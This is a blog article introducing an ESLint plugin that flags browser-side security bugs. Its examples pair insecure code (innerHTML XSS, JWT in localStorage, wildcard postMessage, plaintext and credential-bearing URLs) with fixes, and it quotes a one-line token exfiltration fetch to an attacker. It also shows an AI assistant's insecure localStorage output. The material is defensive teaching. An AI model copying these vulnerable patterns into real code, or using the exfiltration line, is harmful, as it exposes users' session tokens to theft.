---
title: "Browser Security Bugs Your Frontend Passes to Code Review — 45 ESLint Rules Catch Them in CI"
description: "JWT-in-localStorage, innerHTML XSS, postMessage('*'), mixed content, permissive CORS — browser-side bugs a backend pentest and a type-checker never see. A findings report on the patterns that survive review, with 45 CWE-mapped ESLint rules that catch them automatically."
slug: "getting-started-eslint-plugin-browser-security"
canonical_url: "https://ofriperetz.dev/articles/getting-started-eslint-plugin-browser-security"
devto_url: "https://dev.to/ofri-peretz/getting-started-with-eslint-plugin-browser-security-3iop"
devto_id: 3143592
published_at: "2026-01-02T15:20:36Z"
edited_at: "2026-01-11T10:21:38Z"
cover_image: "https://ofriperetz.dev/og/cover/getting-started-eslint-plugin-browser-security"
social_image: "https://ofriperetz.dev/og/article/getting-started-eslint-plugin-browser-security"
reading_time_minutes: 11
tags:
  - "security"
  - "javascript"
  - "devsecops"
  - "node"
author:
  name: "Ofri Peretz"
  username: "ofri-peretz"
  avatar: "https://media2.dev.to/dynamic/image/width=640,height=640,fit=cover,gravity=auto,format=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Fuser%2Fprofile_image%2F3669992%2F50a1f256-472c-48a1-85e8-149459647ea7.png"
  twitter: "ofriperetzdev"
series: "The Hardened Stack"
---

Here is what four browser security bugs look like in the same PR — all of them compiling cleanly, all of them passing CI, none of them showing up in the backend pentest your team scheduled for next quarter:

```ts
// Finding #1 — XSS sink with no sanitization (CWE-79)
el.innerHTML = profile.bio;
// Why it survived review: renders correctly; reviewer checked layout, not sink context
// Rule: no-innerhtml | Fix: el.textContent = profile.bio

// Finding #2 — JWT stored where any injected script can reach it (CWE-922)
localStorage.setItem("token", jwt);
// Why it survived review: first Google result for "store JWT frontend"; works in the demo
// Rule: no-jwt-in-storage | Fix: HttpOnly cookie set by the server

// Finding #3 — token broadcast to any origin that holds the window reference (CWE-346)
widget.contentWindow.postMessage({ authToken }, "*");
// Why it survived review: copied from the vendor's own integration docs
// Rule: no-postmessage-wildcard-origin | Fix: postMessage(payload, "https://widget.example.com")

// Finding #4 — session data transmitted in plaintext (CWE-319)
fetch("http://api.example.com/session");
// Why it survived review: dev environment uses http://; nobody changed it before deploy
// Rule: no-http-urls | Fix: enforce https:// in the URL literal
```

None of those throw. None fail a unit test. Your type-checker is satisfied — `innerHTML` accepts a `string`. The backend pentest will never touch them because they execute in the user's browser, after your server is done.

This is the shape of browser security debt: **it looks identical to correct code.** The dangerous version and the safe version are visually almost indistinguishable, and nothing in the standard toolchain draws the line. That's exactly the line a linter can draw.

**`eslint-plugin-browser-security` is 45 rules for that surface** — every one pinned to a CWE, firing in CI before the code ships. The rest of this article is what those findings actually look like, how they survive review, and how to add the guard.

> *A static linter catches the dangerous pattern the moment it enters the codebase — not after the pentest, not after the postmortem.*

---

If you are starting from scratch on static analysis security tooling, the [30-minute security audit protocol](https://dev.to/ofri-peretz/the-30-minute-security-audit-onboarding-a-new-codebase-4f91) covers how to sequence plugins across a new codebase. For a cross-plugin benchmark, [17 ESLint security plugins compared](https://dev.to/ofri-peretz/i-benchmarked-17-eslint-security-plugins-only-one-found-every-vulnerability-c83) covers where `browser-security` sits relative to the field.

---

## TL;DR

- **45 rules**, every one carrying a `CWE` id and a CVSS score.
- **8 presets**: `flagship`, `recommended` (31 rules), `strict` (all 45), plus
  five **focused starter presets** that enable a high-signal starter rule (or
  two) per surface for gradual adoption — `xss` (`no-innerhtml` + `no-eval`),
  `postmessage` (both wildcard + origin-check rules), and one-rule footholds
  `storage` (`no-sensitive-localstorage`), `websocket` (`require-websocket-wss`),
  `cookies` (`no-sensitive-cookie-js`).
- **Flat-config**, CommonJS package, ESLint `8 || 9 || 10`, Node `>= 18`. No
  runtime peer deps — it lints source.
- It catches _source patterns_, not runtime behavior. It can't see a CSP your
  server sends at runtime or prove your sanitizer is complete — it's the
  earliest layer, not the only one.

---

## Finding #1: `postMessage` — the two security decisions everyone gets wrong

The `postMessage` pattern is the most common source of token exfiltration bugs I see in frontend code, because it requires making two correct decisions simultaneously — and most code makes neither.

### Send side — the `'*'` target origin leaks

```ts
// ❌ no-postmessage-wildcard-origin (CWE-346, CVSS 7.5)
widget.contentWindow.postMessage({ authToken }, "*");
```

The second argument is not decoration — it is a **delivery filter**. The browser
only hands the message to `widget` if `widget`'s _current_ origin matches the
target you specify. `"*"` disables that check: the message is delivered no
matter what origin currently occupies that window. If the iframe has navigated
(an OAuth redirect, an ad, a compromised third-party widget) or an attacker
holds a reference to the window, **they receive your token**.

```ts
// ✅ name the exact origin you intend to talk to
widget.contentWindow.postMessage({ authToken }, "https://widget.example.com");
```

### Receive side — a listener with no `origin` check trusts anyone

```ts
// ❌ require-postmessage-origin-check (CWE-346)
window.addEventListener("message", (event) => {
  applyAuth(event.data.token); // any page that can reach this window can drive it
});
```

Any page that holds a reference to your window — your opener, a page that
embedded you, a popup you spawned — can `postMessage` into this listener. With
no `event.origin` check, attacker-sent data flows straight into your auth state
or DOM.

```ts
// ✅ validate the sender's origin first
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.example.com") return;
  applyAuth(event.data.token);
});
```

**The nuance the origin check alone misses.** `event.origin` answers "what
origin sent this," not "which window sent this." If you embed _two_ frames from
`https://widget.example.com` — the real one and a second, attacker-influenced
instance (an ad slot, a nested iframe the widget itself loaded) — both pass the
string compare. For a privileged listener you also need to pin the sender against the window reference you actually trust:

```ts
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.example.com") return;
  if (event.source !== widget.contentWindow) return; // the window you opened
  applyAuth(event.data.token);
});
```

`require-postmessage-origin-check` enforces the `event.origin` gate — the part
everyone forgets entirely. The `event.source` pin is the second-order control a
linter can't infer for you (it doesn't know _which_ window object you meant), so
treat the rule as the floor, not the ceiling, on any listener that touches auth.

**The concrete chain.** You embed a third-party widget and post it the session
token with `"*"`. The widget's CDN is later compromised (or the iframe `src`
is swapped via a redirect). The attacker's code, now running in that iframe,
receives every message targeted at it — including the token — and `fetch`es it
to their server. No XSS in _your_ origin required; you handed the token across
the boundary yourself. `no-postmessage-wildcard-origin` and
`require-postmessage-origin-check` (both **CWE-346**) make both halves a CI
error.

---

## Finding #2: JWT in `localStorage`

```ts
// ❌ no-jwt-in-storage (CWE-922)
localStorage.setItem("token", jwt);
```

`localStorage` is readable by **any** JavaScript running on your origin —
including a single injected `<script>` from any XSS, a compromised npm
dependency, or a malicious browser extension. There is no `HttpOnly` for
`localStorage`; exfiltration is one `fetch(attacker, {body: localStorage.token})`.

```ts
// ✅ the rule's fix — store it where script can't read it
// Server sets: Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict
```

**This is what an LLM emits when you ask it to wire up auth.** Open any assistant and paste verbatim: _"Store the JWT and read it back on reload."_ You will get `localStorage.setItem(...)` in the first response, essentially every time — because it is the statistical center of a decade of Stack Overflow answers and starter repos that did it the easy way. The model is optimizing for "code that runs," and the insecure version runs identically.

I ran that exact round trip for this post. Verbatim, into the `claude` CLI — _"Write a TypeScript function that stores the JWT and reads it back on page reload."_ Here is the function it returned, pasted as-is:

```ts
// generated output, unedited
const JWT_KEY = "jwt";

export const storeJwt = (token: string): void =>
  localStorage.setItem(JWT_KEY, token);
export const readJwt = (): string | null => localStorage.getItem(JWT_KEY);
```

I dropped that file into a project running `configs.recommended` and ran
`npx eslint .`. **One generated function, two errors on the same line:**

```text
src/auth.ts
  7:3  error  🔒 CWE-922 OWASP:A02-Cryptographic CVSS:8.1 | Storing JWT "JWT_KEY"
              in localStorage exposes it to XSS attacks. Any malicious script can
              steal the token and impersonate the user. | HIGH
              Fix: Store JWTs in HttpOnly cookies set by the server.   no-jwt-in-storage
  7:3  error  🔒 CWE-922 | Storing "JWT_KEY" in localStorage is dangerous.
              localStorage is vulnerable to XSS attacks - any script on the page
              can access it. | HIGH
              Fix: Use httpOnly cookies for tokens, or encrypt data before
              storage.                                          no-sensitive-localstorage

✖ 2 problems (2 errors, 0 warnings)
```

That is not a synthetic example — it's the literal output, `JWT_KEY` and all, from linting code an assistant wrote thirty seconds earlier. The interesting part: this run was against a _security-tuned_ assistant that appended its own "prefer HttpOnly cookies" caveat in prose — and **still emitted the `localStorage` version as the actual code**. The warning in the chat does not stop the insecure line from landing in the file; the lint rule does.

This is also why the fix has to live in CI, not in review. A human reviewer fixes one `localStorage` call; the next prompt regenerates it. A lint rule flags the regenerated bug as reliably as the original. `eslint-plugin-browser-security` turns each of these into a CI error the moment the generated code lands — whether a human or a model wrote it.

`no-jwt-in-storage`, `no-sensitive-localstorage`, `no-sensitive-sessionstorage`,
and `no-sensitive-indexeddb` (all **CWE-922**) cover the storage surface. If
your codebase also has hardcoded API keys or inline secrets, the companion
[`eslint-plugin-secure-coding`](https://ofriperetz.dev/articles/getting-started-eslint-plugin-secure-coding)
catches those separately — including an [autofix for AI-generated hardcoded
secrets](https://ofriperetz.dev/articles/hardcoded-secrets-ai-agents-autofix).

---

## Finding #3: Credentials in URLs

Two rules in the table address credentials leaking through URLs, and both carry CWEs that are easy to confuse with adjacent weakness classes:

| Rule                             | Correct CWE | What it catches |
| -------------------------------- | ----------- | --------------- |
| `no-credentials-in-query-params` | CWE-598     | API keys, tokens, passwords passed as query string parameters — visible in server logs, browser history, `Referer` headers |
| `no-password-in-url`             | CWE-598     | Password values embedded in the URL itself — same exposure path |

CWE-598 is "Use of GET Request Method With Sensitive Query Strings." Credentials in a URL are not hard-coded credentials (CWE-798, which is secrets baked into source at compile time) — they are credentials exposed through an insecure transmission path. The distinction matters when you're triaging against a CVE database or writing a security report: filing the wrong CWE causes the finding to get deprioritized or dismissed.

```ts
// ❌ no-credentials-in-query-params (CWE-598)
fetch(`https://api.example.com/data?api_key=${apiKey}`);
// Appears in access logs, browser history, Referer headers on every outgoing link

// ✅ send credentials in the Authorization header
fetch("https://api.example.com/data", {
  headers: { Authorization: `Bearer ${apiKey}` }
});
```

---

## Add the guard in CI

The four findings above — `postMessage` wildcard, JWT-in-localStorage, credentials in URLs, and plaintext transport — all have the same fix: add `eslint-plugin-browser-security` to your lint pipeline.

```bash
# npm
npm install --save-dev eslint-plugin-browser-security
# yarn
yarn add --dev eslint-plugin-browser-security
# pnpm
pnpm add --save-dev eslint-plugin-browser-security
# bun
bun add --dev eslint-plugin-browser-security
```

Flat config (`eslint.config.js`):

```js
// `configs` is a NAMED export; the default export is the plugin object.
import { configs } from "eslint-plugin-browser-security";

export default [
  configs.recommended, // 31 rules — the sane default
  // configs.strict,      // all 45
  // configs.flagship,    // the ecosystem-flagship rule(s) only
  // adopt one surface at a time:
  // configs.xss, configs.storage, configs.postmessage,
  // configs.websocket, configs.cookies,
];
```

**One gotcha that bit me while capturing the run above:** `configs.recommended`
ships the rules and the plugin, but it does _not_ register a parser or a `files`
glob — so on a TypeScript project, flat config will skip your `.ts` files with
"File ignored because no matching configuration was supplied" and you'll think
the plugin is broken. Give it a parser and a target glob and the rules light up:

```js
import { configs } from "eslint-plugin-browser-security";
import tsParser from "@typescript-eslint/parser";

export default [
  { files: ["**/*.ts", "**/*.tsx"], languageOptions: { parser: tsParser } },
  configs.recommended,
];
```

Run it:

```bash
npx eslint .
```

Each finding carries the CWE, OWASP category, CVSS, and the fix. This is the
real output from linting a `postMessage(payload, "*")` call (the send-side bug
from earlier), not a mock-up:

```text
src/widget.ts
  5:62  error  🔒 CWE-346 OWASP:A01-Broken CVSS:7.5 | postMessage with "*" targetOrigin allows any window to receive the message, potentially leaking sensitive data to malicious sites. | HIGH
               Fix: Specify the exact origin of the target window instead of "*".   no-postmessage-wildcard-origin
```

One thing to notice in that line: the rule tags this `OWASP:A01-Broken` — **A01 (Broken Access Control)**, not the A03/Injection bucket you might expect. A wildcard `postMessage` is an _origin-validation_ failure (CWE-346), so the plugin files it under access control, while the storage finding above carries `A02-Cryptographic` and the XSS rules carry A03. The OWASP tag is per-rule and reflects the actual weakness class, not a blanket category for the whole plugin.

---

## The full rule set

All 45, grouped by category, with each rule's declared CWE:

### XSS / DOM injection

| Rule                          | CWE    |
| ----------------------------- | ------ |
| `no-innerhtml`                | CWE-79 |
| `no-filereader-innerhtml`     | CWE-79 |
| `no-postmessage-innerhtml`    | CWE-79 |
| `no-websocket-innerhtml`      | CWE-79 |
| `no-worker-message-innerhtml` | CWE-79 |
| `no-unescaped-url-parameter`  | CWE-79 |
| `no-unsafe-inline-csp`        | CWE-79 |
| `no-eval`                     | CWE-95 |
| `no-websocket-eval`           | CWE-95 |
| `no-unsafe-eval-csp`          | CWE-95 |

### Token & data storage

| Rule                             | CWE     |
| -------------------------------- | ------- |
| `no-jwt-in-storage`              | CWE-922 |
| `no-sensitive-localstorage`      | CWE-922 |
| `no-sensitive-sessionstorage`    | CWE-922 |
| `no-sensitive-indexeddb`         | CWE-922 |
| `no-credentials-in-query-params` | CWE-598 |
| `no-password-in-url`             | CWE-598 |
| `no-sensitive-data-in-cache`     | CWE-200 |

### Transport security

| Rule                                 | CWE     |
| ------------------------------------ | ------- |
| `no-http-urls`                       | CWE-319 |
| `require-https-only`                 | CWE-319 |
| `no-unencrypted-transmission`        | CWE-319 |
| `detect-mixed-content`               | CWE-311 |
| `no-disabled-certificate-validation` | CWE-295 |
| `no-allow-arbitrary-loads`           | CWE-295 |

### postMessage

| Rule                               | CWE     |
| ---------------------------------- | ------- |
| `no-postmessage-wildcard-origin`   | CWE-346 |
| `require-postmessage-origin-check` | CWE-346 |

### WebSocket

| Rule                    | CWE     |
| ----------------------- | ------- |
| `no-insecure-websocket` | CWE-319 |
| `require-websocket-wss` | CWE-319 |

### Cookies

| Rule                          | CWE      |
| ----------------------------- | -------- |
| `no-cookie-auth-tokens`       | CWE-1004 |
| `no-sensitive-cookie-js`      | CWE-1004 |
| `require-cookie-secure-attrs` | CWE-614  |

### CORS / CSRF / response headers

Note: `no-permissive-cors`, `no-missing-cors-check`, `no-missing-csrf-protection`, `require-csp-headers`, and `no-missing-security-headers` check for _source-level expressions_ that configure these policies. They are not runtime enforcement — they catch code that sets a permissive CORS config or omits a CSP header value in your application source, not a policy your reverse proxy enforces separately.

| Rule                          | CWE      |
| ----------------------------- | -------- |
| `no-permissive-cors`          | CWE-942  |
| `no-missing-cors-check`       | CWE-346  |
| `no-missing-csrf-protection`  | CWE-352  |
| `no-missing-security-headers` | CWE-693  |
| `require-csp-headers`         | CWE-1021 |
| `no-clickjacking`             | CWE-1021 |

### Redirects, URLs & misc

| Rule                             | CWE     |
| -------------------------------- | ------- |
| `no-insecure-redirects`          | CWE-601 |
| `require-url-validation`         | CWE-601 |
| `no-unvalidated-deeplinks`       | CWE-939 |
| `no-dynamic-service-worker-url`  | CWE-829 |
| `require-mime-type-validation`   | CWE-434 |
| `require-blob-url-revocation`    | CWE-401 |
| `no-client-side-auth-logic`      | CWE-602 |
| `no-sensitive-data-in-analytics` | CWE-359 |
| `no-tracking-without-consent`    | CWE-359 |

That's all 45 (10 + 7 + 6 + 2 + 2 + 3 + 6 + 9). The `recommended` preset turns
on 31 of them as errors/warnings; `strict` turns on all 45.

Each rule carries its own OWASP tag in the output, mapped from its CWE rather
than a blanket plugin-wide category — so the labels you'll actually see are
mixed: the XSS block reports A03 (Injection), JWT-in-`localStorage` and the
transport rules report A02 (Cryptographic Failures, as the captured findings
above show), the `postMessage` pair reports A01 (Broken Access Control), and the
broader auth/identity rules land in A07. If you want the client-side surface
scored against that framework rather than rule-by-rule, I broke down [which
OWASP categories ESLint rules actually hold up
against](https://ofriperetz.dev/articles/mapping-your-codebase-to-owasp-top-10-with-247-eslint-rules)
separately — including the two that turn out to be vendor theater.

---

## Compatibility

| Surface              | Support                                                                                                                                                                                                 |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Package managers** | npm, yarn, pnpm, bun — plain dev dependency                                                                                                                                                             |
| **Node**             | `>= 18.0.0`                                                                                                                                                                                             |
| **ESLint**           | `^8.0.0 \|\| ^9.0.0 \|\| ^10.0.0`, flat config                                                                                                                                                          |
| **Module system**    | CommonJS — loads from both `eslint.config.js` and `eslint.config.mjs`                                                                                                                                   |
| **Runtime peers**    | None — it reads source AST; nothing to install at runtime                                                                                                                                               |
| **Oxlint**           | Loads under Oxlint's JS-plugin runner via the `interlace-browser-security` port; the flagship rule is wired into the Oxlint config and parity-checked in CI. The full 45-rule set runs on ESLint today. |

---

## What it does — and doesn't — see

- **Source patterns, not runtime.** It flags `innerHTML =`, `postMessage(…, "*")`,
  `http://` literals, `localStorage.setItem("token", …)`. It does **not**
  evaluate the CSP your server emits at runtime or prove a sanitizer is
  complete. The header rules (`require-csp-headers`,
  `no-missing-security-headers`) check that you _set_ a policy in source, not
  that the policy is airtight.
- **Heuristics have edges.** Storage and "sensitive data" rules use
  name/shape heuristics; tune them to your code rather than assuming the
  defaults are exhaustive.
- **It's the earliest layer.** Pair it with a real CSP, framework escaping
  (React/Solid/Svelte auto-escape — these rules catch where you opt _out_ via
  `dangerouslySetInnerHTML` and friends), and runtime monitoring.

---

## Where this sits in the ecosystem

General linters and React-specific rules (`eslint-plugin-no-unsanitized`,
`react/no-danger`) cover slices of this — usually the `innerHTML` corner.
`browser-security` is the dedicated, framework-agnostic layer for the _whole_
browser surface: transport, storage, cookies, CORS/CSRF, `postMessage`,
WebSocket, service workers — each finding tagged with a CWE and CVSS. It's the
client-side member of the [Interlace](https://eslint.interlace.tools) family,
complementary to the server-side plugins (`-express-security`,
`-nestjs-security`, `-jwt`, …) that guard the other side of the request.

The token in that `localStorage` call has to come from somewhere. This plugin
catches the client mishandling it; on the issuing side,
[`eslint-plugin-jwt`](https://ofriperetz.dev/articles/getting-started-eslint-plugin-jwt)
catches the server that signs it wrong — most infamously the
[`alg: none` forgery](https://ofriperetz.dev/articles/the-jwt-algorithm-none-attack-the-vulnerability-in-1-line-of-code-d9g),
where a one-character header change mints an admin token. Both are part of **The
Hardened Stack** series; run them together and you've covered the JWT's whole
round trip — minted, signed, transported, and stored.

---

## Links

- 📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
- 📖 [Full rule docs (per-rule CWE + examples)](https://eslint.interlace.tools/docs/security/plugin-browser-security/rules)
- 💻 [Source on GitHub](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security)

Run `npx eslint .` with `configs.recommended` on your frontend before you read
the next paragraph. The first finding it surfaces is almost always a
`localStorage` token or a `postMessage` wildcard nobody remembered writing.

What's the most dangerous DOM manipulation pattern you've shipped that a reviewer missed — and would your team recognize it in an ESLint rule output? I'm especially collecting the third-party-widget stories: the analytics snippet, the chat bubble, the embedded checkout you handed a token to with `"*"` because the vendor's own docs told you to. Drop the rule name (and the vendor, if you're brave) in the comments — I'm tracking which of these 45 fires most in the wild, and my money's on the `postMessage` pair.

::dev-to-cta{url="https://github.com/ofri-peretz/eslint"}
⭐ Star on GitHub if your frontend does any of the above.
::

---

*[eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security) is part of the [Interlace ESLint ecosystem](https://eslint.interlace.tools). Source on [GitHub](https://github.com/ofri-peretz/eslint) · Follow: [Dev.to/ofri-peretz](https://dev.to/ofri-peretz)*

---

I'm **Ofri Peretz**, a security engineering leader and the author of the
Interlace ESLint ecosystem — domain-specific static analysis for security,
reliability, and performance on the Node.js stack. `browser-security` is its
client-side layer.

[ofriperetz.dev](https://ofriperetz.dev) · [LinkedIn](https://linkedin.com/in/ofri-peretz) · [GitHub](https://github.com/ofri-peretz)

---

**The Hardened Stack series** — guarding one request end to end:

← _Issuing side:_ [eslint-plugin-jwt — the server that signs the token](https://ofriperetz.dev/articles/getting-started-eslint-plugin-jwt)
 · **You are here:** the browser that stores it ·
_Next:_ [What 12 seconds of ESLint found in an inherited NestJS codebase](https://ofriperetz.dev/articles/i-inherited-a-nestjs-codebase-the-first-lint-run-found-6-vulnerabilities) →
